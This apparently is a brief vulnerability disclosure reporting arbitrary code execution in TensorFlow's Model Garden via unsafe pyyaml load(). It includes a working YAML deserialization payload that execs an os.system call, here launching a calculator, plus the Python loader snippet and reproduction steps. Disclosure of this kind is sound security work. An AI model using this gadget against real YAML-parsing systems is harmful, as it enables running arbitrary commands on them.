# Description
**Arbitrary Code Excecution** in Tensorflow/Models.The TensorFlow Model Garden is a repository with a number of different implementations of state-of-the-art (SOTA) models and modeling solutions for TensorFlow users. We aim to demonstrate the best practices for modeling so that TensorFlow users can take full advantage of TensorFlow for their research and product development
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **pyyaml**
# Exploit code
**Python File**
```python
import params_dict
exploit = params_dict.read_yaml_to_params_dict('exploit.yml')
print(exploit)
```
**YAML File**
```yml
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
```
# POC
* place the exploit codes **models/hyperparameters**
* Run the python code 

![](https://cdn.discordapp.com/attachments/749019614352244777/784023167470796810/Screenshot_from_2020-12-03_17-17-46.png)
